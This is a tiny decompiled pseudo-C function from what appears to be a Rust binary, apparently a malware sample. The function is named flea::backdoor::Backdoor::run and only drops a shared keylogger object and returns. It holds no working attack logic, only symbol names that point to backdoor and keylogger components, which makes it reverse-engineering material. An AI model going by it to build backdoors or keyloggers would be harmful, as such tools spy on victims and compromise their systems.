__int64 __fastcall flea::backdoor::Backdoor::run(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // [rsp+0h] [rbp-8h] BYREF

  v5 = a4;
  core::ptr::drop_in_place<alloc::sync::Arc<std::sync::mutex::Mutex<flealib::keylogger::Keylogger>>>(&v5);
  return v5;
}